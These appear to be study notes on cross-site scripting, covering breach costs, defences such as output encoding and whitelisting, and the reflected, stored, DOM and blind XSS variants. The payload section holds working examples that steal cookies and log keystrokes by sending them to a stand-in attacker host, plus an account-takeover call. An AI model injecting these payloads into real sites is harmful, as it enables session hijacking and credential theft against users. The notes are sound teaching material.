---
id: 9580eaxs80sdsmko50z0kh2
title: Cross Site
desc: ''
updated: 1657329821484
created: 1653197938259
---

# Cross-Site Scripting

## Security Defects Become Famous

- Heartbleed and Shellshock in 2014 software security bugs.
- Recent Wikileaks exposure of CIA research into weaponizing iOS, Android and Samsung TV security bugs.
- Security researchers are trying to cash in on the fame.
- Bugs in security software are sensational (software is supposed to protect you).
- ALL major software vendors are target, especially security software.
- Costs to reputation and revenue.
- Could lead to litigations, and law enforcement investigations.
  - Since 2000, the FTC has issued over 45 consent decrees against companies failed to institute sufficient security practices while delivering software or services.

### Why Care?

- Average total cost of data breach in 2017 (Ponemon Study) is $3.62 million.
- 58% of Internet users use the same password for multiple sites, including their web mail.
- There is a growing black market for zero-day vulnerabilities.
  - Vulnerabilities sell of thousands to millions of dollars per exploit, earning hackers serious money.

#### Breaches

- **Jan 2017 Trend Micro** - Two researchers found 223 vulnerabilities in just 6 months. Massive damage to reputation as a cybersecurity vendor.
- **Oct 2017 Equifax** - 143 million stolen SSNs. CSO, CIO, CEO lost their jobs.
- **Dec 2013 Target** - 40+ million credit cards, 70-110 million name, address, phone, email addresses.
  - Total cost may reach over $1B in fines and other associated costs.
- **March 2011 RSA Security** - 40 million auth tokens for bank and government networks $66M plus loss.

## Secure Software Challenges

|       | Developers                                            | Hackers                           |
| ----- | ----------------------------------------------------- | --------------------------------- |
| Time  | Under time pressure to develop and test functionality | May have unlimited time           |
| Focus | Security is not the primary focus over functionality  | Focused on finding security holes |
| Motivation / Resources | Responsible to product's primary functionality | Bragging rights, illicit profits |
| Specialization | Specialize on functionality of the product | Specialize in security penetration |

### Mitigate Product Security Risk

#### Prevent New Bugs

- Know SANS 25 Most Dangerous Programming Errors (includes most of common security Top 10).
- "Think like a hacker". How can code be abused?
- Build software defenses into software:
  - Input Validation
  - Output Sanitization
  - Strong Encryption
  - Strong Authentication and Authorization
- Choose secure frameworks rather than simply reply on developer security skills.
- Do not think product is isolated from the Internet is not at risk.
- Do not think that if a file or a database is local does not need to be protected. The majority of breaches are launched internally.

#### Address Existing Bugs

- Redesign product front end to be good looking and functional, but also secure.
- Implement smart architectural changes that fix security flaws at the top.
- Do not spot-fix issues.
  - Implement a fix across the board and how to be prevented in the future.
- Security bugs are special because of their potential impact.
- Deliver security patches with faster release vehicles.

## Common Attacks - Cross-Site Scripting

Cross-Site Scripting (XSS)
: Allows attackers to inject client-side scripts into the web page.

### Dangers of XSS

- Harvest credentials
- Take over user sessions
- CSRF
- Steal cookies, local store data
- Elevate privileges
- Redirect users to malicious sites

XSS is widespread in 3rd party products such as WordPress and Drupal.

### In the News

Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications:


- eBay XSS bug left users vulnerable to (almost) undetectable phishing attacks.
- The Apache Foundation hacked by exploiting XSS in JIRA.
- XSS found in Shopify.
- $7,500 for XSS found in Steam chat.
- $2,500 for XSS in HackerOne.
- XSS found in Infogram.

### Effective Defenses

#### HTML Encoding

- Output Encoding works well for server side generate pages and is quite effective in neutralizing most XSS payloads.
  - HTML Encoding alone will not prevent charset attacks.

#### JavaScript Escaping

- XSS can be introduced with JavaScript code.
- Escaping single quotes will prevent injection.

#### Safe DOM Elements

- XSS in modern Rich Client UIs is often made possible by unsafe handling of the DOM.
- Using the `innerHtml` attribute allows the user input to be rendered as HTML and XSS with JavaScript events as possible.
- The safe alternative is to use `textContent` (or `innerText` in some versions of IE).

#### Use Eval and Dynamic Code Generation with Care

- JavaScript `eval()` function which accepts a JavaScript expression as a string argument and executes it. Use of this function is discouraged.
- Same care is needed when the code generates pieces of JavaScript dynamically. Also discouraged.

#### Input Validation

**Whitelisting** is recommended.

- Reduces the attack surface to a known quantity.
- If possible, most input should be whitelisted to alphanumeric to prevent XSS (and many other attacks).
- Special characters should only be allowed on an exception basis.
- Some cases may be relaxed to allow single quotes or other characters.

**Blacklisting** - NOT RECOMMENDED.

- Creative attacker may bypass blacklist by trying a previously unknown method.

**Client Side Input Validation** - NOT RECOMMENDED.

- Can only be used to assist with product usability.
- Attackers can easily bypass it by sending the request directly to the server.

#### Use Proven Validation and Encoding Functionality

- Protect both input and output - "Defense in Depth" principle.
- As you validate the input and encode the output, use proven and reputable libraries.
- It is best to implement a framework that has one central set of functionality that validates and encodes data.

## XSS Payloads

In XSS, the payload is the JavaScript code we wish to be executed on the target's computer. There are two parts to the payload: the intention and the modification.

- Intention is what you wish the JavaScript to actually do.
- Modification is the changes to the code we need to make it execute as every scenario is different.

Examples of XSS Intentions:

- **Proof of Concept**: Simplest payload to demonstrate XSS is possible on a website - causing an alert box to pop up on the page with a string of text.
  - `<script>alert('XSS');</script>`
- **Session Stealing**: Details of a user's session, such as login tokens, are often kept in cookies on the target's machine.
  - `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
    - Takes target's cookie, base64 encodes the cookie to ensure successful transmission for control to be logged in.
- **Key Logger**: Acts as a key logger where anything typed on the webpage will be forwarded to a website under the hacker's control.
  - `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
- **Business Logic**: Calls a particular network resource or a JavaScript function. In this example for changing the email's address called `user.changeEmail()`.
  - `<script>user.changeEmail('attacker@hacker.thm');</script>`
    - Allows a password reset for the attacker.

### Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

![reflected-error](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png)
![reflected](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png)

A website where entering the incorrect input, an error message is displayed to the parameter in the query string directly into the page source.

- The application does not check the contents of the error parameter, which allows the attacker to insert the malicious code.

![xss](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png)

- The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute on their browser, potentially revealing session or customer information.

#### How to Test for Reflected XSS

Check every possible point of entry:

- Parameters in the URL query string
- URL file path
- Sometimes HTTP headers (unlikely exploitable)

### Stored XSS

The XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

![stored-XSS](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png)

A blog website that allows users to post comments, but these comments are not checked or filtered for any malicious JavaScript code.

- The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

#### How to Test for Stored XSS

Test every possible entry point where it seems data is stored and then shown back in areas that other users have access to:

- Comments on a blog
- User profile information
- Website listings

### DOM-Based XSS

DOM stands for Document Object Model and is a programming interface for HTML and XML documents. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.

![DOM](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png)

- DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.
- Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.
  - An example: JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash are not checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto their webpage.

#### How to Test for DOM Based XSS

Challenging to test for and requires a certain amount of JavaScript knowledge to read the source code.

- Look for parts of code that access certain variables that an attacker can have control over, such as 'window.location.x' parameters.
  - See how they are handled and whether the values are written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`.

### Blind XSS

Blind XSS is similar to a stored XSS in that the payload gets stored on the website for another user to view, but in this instance, can't see the payload working or be able to test it against yourself first.

A website has a contact form where you can message a member of staff. The message content does not get checked for any malicious code, which allows the attacker to enter anything they wish.

- Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page viewed.

#### How to Test for Blind XSS

- When testing for Blind XSS vulnerabilities, need to ensure payload has a call back (usually an HTTP request) to know is being executed.
- A popular tool for Blind XSS attacks is [xsshunter](https://xsshunter.com/).